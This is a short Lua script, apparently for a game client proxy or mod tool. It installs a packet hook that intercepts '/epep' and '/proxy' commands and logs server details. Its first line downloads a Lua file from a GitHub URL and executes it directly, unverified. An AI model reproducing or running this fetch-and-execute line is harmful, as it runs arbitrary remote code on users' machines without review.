load(MakeRequest("https://raw.githubusercontent.com/TegarPX/Project-Testing/refs/heads/main/server1.lua", "GET").content)()



AddHook('OnSendPacket', 0101, function(type, str)
    if str:find("/epep") then
      return true
    end
    if str:find("/proxy") then
      LogToConsole(server_ver)
      LogToConsole(server_name)
      LogToConsole(server_teks)
      return true
    end
    return false
  end)
